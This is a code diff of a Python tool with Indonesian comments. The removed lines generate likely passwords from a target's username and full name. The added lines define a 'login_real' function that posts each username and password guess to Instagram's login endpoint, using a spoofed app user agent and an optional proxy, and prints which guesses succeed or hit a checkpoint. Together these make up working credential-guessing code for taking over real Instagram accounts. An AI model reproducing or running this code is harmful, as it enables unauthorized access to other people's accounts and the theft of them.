@@ -1,49 +1,65 @@
-import re
+# utils/tools.py
 
-def generate_passwords(username, full_name):
-    name_parts = full_name.lower().split()
+import os
+import requests
+from colorama import Fore
 
-    # Pisahkan huruf & angka dari username
-    username_letters = ''.join(re.findall(r'[a-zA-Z]', username))
-    username_digits = ''.join(re.findall(r'\d+', username))  # bisa kosong
+def clear_terminal():
+    os.system('cls' if os.name == 'nt' else 'clear')
 
-    base_names = list(set([
-        username.lower(),
-        username.upper(),
-        username_letters.lower(),
-        username_letters.upper()
-    ] + name_parts))
+def get_cookie_from_file(path):
+    if not os.path.exists(path):
+        return None
+    with open(path, 'r') as f:
+        return f.read().strip()
 
-    suffixes = ["", "1", "12", "123", "1234", "12345", "123456", "2024", "2025", "@123", "#123", "_123", "!", "0"]
+def load_list_from_file(path):
+    if not os.path.exists(path):
+        return []
+    with open(path, 'r') as f:
+        return [line.strip() for line in f if line.strip()]
 
-    combinations = set()
+def login_real(username, password, user_agent=None, proxy=None):
+    """
+    Login nyata ke Instagram menggunakan kombinasi username + password
+    """
+    session = requests.Session()
 
-    # Kombinasi base + suffix
-    for base in base_names:
-        for suffix in suffixes:
-            pwd = base + suffix
-            if len(pwd) >= 6:
-                combinations.add(pwd)
+    headers = {
+        "User-Agent": user_agent or "Instagram 250.0.0.17.116 Android",
+        "X-IG-App-ID": "936619743392459",
+        "X-CSRFToken": "missing",
+        "Accept": "*/*",
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+    }
 
-    # Tambahan angka 0–9
-    for i in range(10):
-        pwd = username_letters + str(i)
-        if len(pwd) >= 6:
-            combinations.add(pwd)
+    payload = {
+        'username': username,
+        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:0:{password}',
+        'queryParams': '{}',
+        'optIntoOneTap': 'false'
+    }
 
-    # Tambahan angka 00–99
-    for i in range(100):
-        pwd = username_letters + str(i).zfill(2)
-        if len(pwd) >= 6:
-            combinations.add(pwd)
+    try:
+        response = session.post(
+            'https://www.instagram.com/accounts/login/ajax/',
+            data=payload,
+            headers=headers,
+            proxies={"http": proxy, "https": proxy} if proxy else None,
+            timeout=10
+        )
 
-    # Variasi dari digit di username (misal: 771 → 77, 71, 17, dll)
-    if username_digits:
-        for i in range(len(username_digits)):
-            for j in range(i + 1, len(username_digits) + 1):
-                digit_part = username_digits[i:j]
-                pwd = username_letters + digit_part
-                if len(pwd) >= 6:
-                    combinations.add(pwd)
-
-    return list(combinations)
+        if response.status_code == 200:
+            res_json = response.json()
+            if res_json.get("authenticated"):
+                print(Fore.GREEN + f"✅ LOGIN SUKSES: {username} | {password}")
+                return True
+            elif res_json.get("message") == "checkpoint_required":
+                print(Fore.YELLOW + f"🔒 CHECKPOINT: {username} | {password}")
+            else:
+                print(Fore.RED + f"❌ LOGIN GAGAL: {username} | {password}")
+        else:
+            print(Fore.RED + f"⚠️ REQUEST ERROR {response.status_code}: {username}")
+    except Exception as e:
+        print(Fore.RED + f"🔥 ERROR: {e}")
+    return False
